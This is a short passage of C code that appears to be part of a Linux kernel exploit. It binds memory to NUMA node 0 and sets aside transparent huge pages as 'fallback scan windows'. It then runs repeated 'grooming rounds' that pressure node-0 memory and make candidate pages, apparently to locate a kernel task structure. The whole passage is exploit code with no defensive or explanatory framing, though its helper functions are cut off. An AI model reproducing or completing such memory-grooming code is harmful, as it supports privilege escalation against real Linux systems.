  /* Preserve two unpressured node-0 THPs as fallback scan windows. */
  unsigned long nodemask = 1;
  syscall(SYS_set_mempolicy, MPOL_BIND, &nodemask, 8 * sizeof(nodemask));
  struct cand pre[2] = {0};
  int npre = make_candidates(pre, 2, "pre");
  syscall(SYS_set_mempolicy, MPOL_DEFAULT, NULL, 0);

  size_t task = (size_t)-1;
  for (int round = 0; round < 3 && task == (size_t)-1; round++) {
    printf("[*] grooming round %d\n", round);
    pressure_node0();
    struct cand c[8] = {0};
    char tag[8];
    snprintf(tag, sizeof(tag), "r%d_", round);
    int n = make_candidates(c, 6, tag);
